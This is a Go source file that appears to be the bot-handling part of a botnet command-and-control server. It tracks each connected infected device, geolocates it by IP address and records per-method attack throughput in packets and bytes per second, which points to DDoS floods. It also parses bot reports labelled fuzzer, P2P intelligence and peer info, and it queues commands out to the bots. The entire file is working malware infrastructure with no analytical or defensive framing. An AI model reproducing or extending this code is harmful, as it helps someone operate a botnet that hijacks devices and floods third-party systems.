package main
import (
    "encoding/binary"
    "net"
    "sync"
    "time"
)
type AttackStats struct {
    MethodID    uint8
    PPS         uint64
    BPS         uint64
    PacketsSent uint64
    BytesSent   uint64
    StartTime   time.Time
    LastUpdate  time.Time
}
type Bot struct {
    uid         int
    conn        net.Conn
    version     byte
    source      string
    writeMu     sync.Mutex
    connectedAt time.Time
    statsMu     sync.RWMutex
    activeAttacks map[uint8]*AttackStats
    totalPPS    uint64
    totalBPS    uint64
    country     string
    countryName string
    geoX        int
    geoY        int
}
func NewBot(conn net.Conn, version byte, source string) *Bot {
    ipStr := conn.RemoteAddr().String()
    country := getCountryByIP(ipStr)
    countryName := getCountryName(country)
    geoX, geoY := getCountryCoords(country)
    return &Bot{
        uid: -1,
        conn: conn,
        version: version,
        source: source,
        connectedAt: time.Now(),
        activeAttacks: make(map[uint8]*AttackStats),
        country: country,
        countryName: countryName,
        geoX: geoX,
        geoY: geoY,
    }
}
func (this *Bot) UpdateStats(methodID uint8, pps uint64, bps uint64) {
    this.statsMu.Lock()
    defer this.statsMu.Unlock()
    if stats, exists := this.activeAttacks[methodID]; exists {
        stats.PPS = pps
        stats.BPS = bps
        stats.PacketsSent += pps
        stats.BytesSent += bps
        stats.LastUpdate = time.Now()
    } else {
        this.activeAttacks[methodID] = &AttackStats{
            MethodID:    methodID,
            PPS:         pps,
            BPS:         bps,
            PacketsSent: pps,
            BytesSent:   bps,
            StartTime:   time.Now(),
            LastUpdate:  time.Now(),
        }
    }
    this.totalPPS = 0
    this.totalBPS = 0
    for _, stats := range this.activeAttacks {
        this.totalPPS += stats.PPS
        this.totalBPS += stats.BPS
    }
}
func (this *Bot) GetStats() map[uint8]*AttackStats {
    this.statsMu.RLock()
    defer this.statsMu.RUnlock()
    result := make(map[uint8]*AttackStats)
    for k, v := range this.activeAttacks {
        result[k] = &AttackStats{
            MethodID:    v.MethodID,
            PPS:         v.PPS,
            BPS:         v.BPS,
            PacketsSent: v.PacketsSent,
            BytesSent:   v.BytesSent,
            StartTime:   v.StartTime,
            LastUpdate:  v.LastUpdate,
        }
    }
    return result
}
func (this *Bot) GetTotalPPS() uint64 {
    this.statsMu.RLock()
    defer this.statsMu.RUnlock()
    return this.totalPPS
}
func (this *Bot) GetTotalBPS() uint64 {
    this.statsMu.RLock()
    defer this.statsMu.RUnlock()
    return this.totalBPS
}
func (this *Bot) GetIP() string {
    return this.conn.RemoteAddr().String()
}
func (this *Bot) GetUptime() time.Duration {
    return time.Since(this.connectedAt)
}
func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)
    lenBuf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        n, err := this.conn.Read(lenBuf)
        if err != nil || n != 2 {
            return
        }
        length := binary.BigEndian.Uint16(lenBuf)
        if length == 0 {
            if _, err := this.conn.Write(lenBuf); err != nil {
                return
            }
            continue
        }
        if length > 2 {
            dataBuf := make([]byte, length-2)
            n, err = this.conn.Read(dataBuf)
            if err != nil || n != len(dataBuf) {
                return
            }
            if len(dataBuf) >= 2 && dataBuf[0] == 0xFF && dataBuf[1] == 0xFF {
                if len(dataBuf) >= 3 {
                    count := int(dataBuf[2])
                    pos := 3
                    for i := 0; i < count && pos+9 <= len(dataBuf); i++ {
                        methodID := uint8(dataBuf[pos])
                        pos++
                        pps := uint64(dataBuf[pos])<<24 | uint64(dataBuf[pos+1])<<16 | 
                               uint64(dataBuf[pos+2])<<8 | uint64(dataBuf[pos+3])
                        pos += 4
                        bps := uint64(dataBuf[pos])<<24 | uint64(dataBuf[pos+1])<<16 | 
                               uint64(dataBuf[pos+2])<<8 | uint64(dataBuf[pos+3])
                        pos += 4
                        this.UpdateStats(methodID, pps, bps)
                    }
                }
                continue
            }
            if len(dataBuf) >= 2 && dataBuf[0] == 0xFF && dataBuf[1] == 0xFE {
                HandleFuzzerReport(this.GetIP(), dataBuf)
                continue
            }
            if len(dataBuf) >= 2 && dataBuf[0] == 0xFF && dataBuf[1] == 0xFD {
                HandleP2PIntelligenceReport(this.GetIP(), dataBuf)
                continue
            }
            if len(dataBuf) >= 2 && dataBuf[0] == 0xFF && dataBuf[1] == 0xFC {
                HandleP2PPeerInfo(this.GetIP(), dataBuf)
                continue
            }
        }
        if _, err := this.conn.Write([]byte{0, 0}); err != nil {
            return
        }
    }
}
func (this *Bot) QueueBuf(buf []byte) {
    this.writeMu.Lock()
    defer this.writeMu.Unlock()
    if _, err := this.conn.Write(buf); err != nil {
        return
    }
}
